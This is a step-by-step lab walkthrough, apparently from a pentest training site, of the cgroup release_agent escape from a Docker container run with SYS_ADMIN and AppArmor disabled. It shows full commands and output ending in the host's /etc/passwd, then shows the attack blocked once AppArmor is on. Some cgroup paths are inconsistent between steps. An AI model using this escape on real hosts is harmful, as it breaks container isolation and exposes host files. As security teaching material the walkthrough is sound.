# Break out of a docker container.​ Privilege Escalation via Cgroups.


* Run a container with the capability "SYS_ADMIN" and disabling App Armor

```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
Output:
```
pentester@NotSoSecure:~$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
2b55860d4c66: Pull complete
Digest: sha256:86181188d631f0699afaefb177631b21a6d692629679443197472a3df6355012
Status: Downloaded newer image for ubuntu:latest
root@73e3f292018e:/#
```
* Inside the container create a directory 'cgrp' in /tmp
```bash
mkdir /tmp/cgrp
```
Output:
```bash
root@73e3f292018e:/# mkdir /tmp/cgrp
root@73e3f292018e:/# ls -la /tmp/
total 12
drwxrwxrwt 1 root root 4096 Sep  2 04:46 .
drwxr-xr-x 1 root root 4096 Sep  2 04:42 ..
drwxr-xr-x 2 root root 4096 Sep  2 04:46 cgrp
```
* Mount the RDMA cgroup controller by using the below command:
```bash
mount -t cgroup -o rdma cgroup /tmp/cgrp
```
Output:
```
root@73e3f292018e:/# mount -t cgroup -o rdma cgroup /tmp/cgrp
root@73e3f292018e:/# ls -la /tmp/cgrp/
total 4
dr-xr-xr-x 2 root root    0 Sep  2 04:39 .
drwxrwxrwt 1 root root 4096 Sep  2 04:46 ..
-rw-r--r-- 1 root root    0 Sep  2 04:39 cgroup.clone_children
-rw-r--r-- 1 root root    0 Sep  2 04:39 cgroup.procs
-r--r--r-- 1 root root    0 Sep  2 04:39 cgroup.sane_behavior
-rw-r--r-- 1 root root    0 Sep  2 04:39 notify_on_release
-rw-r--r-- 1 root root    0 Sep  2 04:39 release_agent
-rw-r--r-- 1 root root    0 Sep  2 04:39 tasks
root@73e3f292018e:/#
```
* Create a child cgroup inside /tmp/cgrp 
```bash
mkdir /tmp/cgrp/childgrp
```
Output:
```
root@73e3f292018e:/# mkdir /tmp/cgrp/childgrp
root@73e3f292018e:/# ls -la /tmp/cgrp/
total 4
dr-xr-xr-x 3 root root    0 Sep  2 04:54 .
drwxrwxrwt 1 root root 4096 Sep  2 04:46 ..
-rw-r--r-- 1 root root    0 Sep  2 04:47 cgroup.clone_children
-rw-r--r-- 1 root root    0 Sep  2 04:47 cgroup.procs
-r--r--r-- 1 root root    0 Sep  2 04:47 cgroup.sane_behavior
drwxr-xr-x 2 root root    0 Sep  2 04:54 childgrp
-rw-r--r-- 1 root root    0 Sep  2 04:47 notify_on_release
-rw-r--r-- 1 root root    0 Sep  2 04:47 release_agent
-rw-r--r-- 1 root root    0 Sep  2 04:47 tasks
root@73e3f292018e:/# ls -la /tmp/cgrp/childgrp/
total 0
drwxr-xr-x 2 root root 0 Sep  2 04:54 .
dr-xr-xr-x 3 root root 0 Sep  2 04:54 ..
-rw-r--r-- 1 root root 0 Sep  2 04:54 cgroup.clone_children
-rw-r--r-- 1 root root 0 Sep  2 04:54 cgroup.procs
-rw-r--r-- 1 root root 0 Sep  2 04:54 notify_on_release
-r--r--r-- 1 root root 0 Sep  2 04:54 rdma.current
-rw-r--r-- 1 root root 0 Sep  2 04:54 rdma.max
-rw-r--r-- 1 root root 0 Sep  2 04:54 tasks
root@73e3f292018e:/#
```
* Enable the cgroup notifications on release of the child i.e 'childgrp' by enabling the 'notify_on_release' 

```bash
echo 1 > /tmp/cgrp/childgrp/notify_on_release
```
Output:
```bash
root@73e3f292018e:/# cat /tmp/cgrp/childgrp/notify_on_release
0
root@73e3f292018e:/# echo 1 > /tmp/cgrp/childgrp/notify_on_release
root@73e3f292018e:/# cat /tmp/cgrp/childgrp/notify_on_release
1
root@73e3f292018e:/#
```
* Obtain the container's path on the host via /etc/mtab file :
```bash
cat /etc/mtab | grep upperdir
```
Output:
```
root@73e3f292018e:/# cat /etc/mtab | grep upperdir
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/2BDQ47NNT3NNOGOSRDGTILVSXF:/var/lib/docker/overlay2/l/LUFOVIMLYRB7O7U3GWXDOOUCV7,upperdir=/var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff,workdir=/var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/work 0 0
root@73e3f292018e:/#
```
* Copy the above path to an env variable Cpath

```bash
root@73e3f292018e:/# cpath=/var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff
root@73e3f292018e:/# echo $cpath
/var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff
root@73e3f292018e:/#
```
* Setup the RDMA cgroup release agent to execute a '/command' script :
```bash
echo "$cpath/command" > /tmp/cgrp/release_agent
```
Output:
```
root@73e3f292018e:/# cat /tmp/cgrp/release_agent

root@73e3f292018e:/# echo "$cpath/command" > /tmp/cgrp/release_agent
root@73e3f292018e:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff/command
root@73e3f292018e:/#

```
* Create the /command bash script that will execute the command 'cat /etc/passwd' and copy the input to the /output file. 

```bash
echo '#!/bin/sh' > /command
```
```bash
echo "cat /etc/passwd > $cpath/output" >> /command
```
Output:
```bash
root@73e3f292018e:/# echo '#!/bin/sh' > /command
root@73e3f292018e:/# echo "cat /etc/passwd > $cpath/output" > /command
root@73e3f292018e:/# cat /command
cat /etc/passwd > /var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff/output
root@73e3f292018e:/#
```
* set the necessary permissions to /command

```bash
chmod  a+x /command
```
```bash
cat /command
```
Output:
```bash
root@73e3f292018e:/# chmod  a+x /command
root@73e3f292018e:/# ls -la /command
-rwxr-xr-x 1 root root 131 Sep  2 11:39 /command
root@73e3f292018e:/# cat /command
#!/bin/sh
cat /etc/passwd > /var/lib/docker/overlay2/e2af493d57f466001eb3b309e13987dd307422ae439b853810a893f94a36096c/diff/output
root@73e3f292018e:/#
```
*  The attack can be executed by creating a ‘/bin/sh’ process and writing its PID to the cgroup.procs file inside the child cgroup directory (/tmp/cgrp/childcgrp). The output from the /command bash script will be written to /output file.

```bash
sh -c “echo \$\$  > /tmp/cgrp/childcgrp/cgroup.procs”
```
```bash
cat /output
```
Output:
```bash
root@73e3f292018e:/# sh -c "echo \$\$ > /tmp/c1/ch1/cgroup.procs"
root@73e3f292018e:/# cat /output
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
pentester:x:1000:1000:pentester,,,:/home/pentester:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
ntp:x:108:114::/nonexistent:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
root@73e3f292018e:/#

```

### Retry the above exercise, without disabling App Armor

* Run a container with the capability "SYS_ADMIN"
```bash
docker run --rm -it --cap-add=SYS_ADMIN ubuntu bash
```
* Inside the container create a directory 'cgrp' in /tmp
```bash
mkdir /tmp/cgrp
```
* Mounting a cgroup is disallowed
```bash
mount -t cgroup -o rdma cgroup /tmp/cgrp
```
Output:
```bash
root@810bcd93f243:/# mount -t cgroup -o rdma cgroup /tmp/cgrp
mount: /tmp/cgrp: cannot mount cgroup read-only.
root@810bcd93f243:/#
```

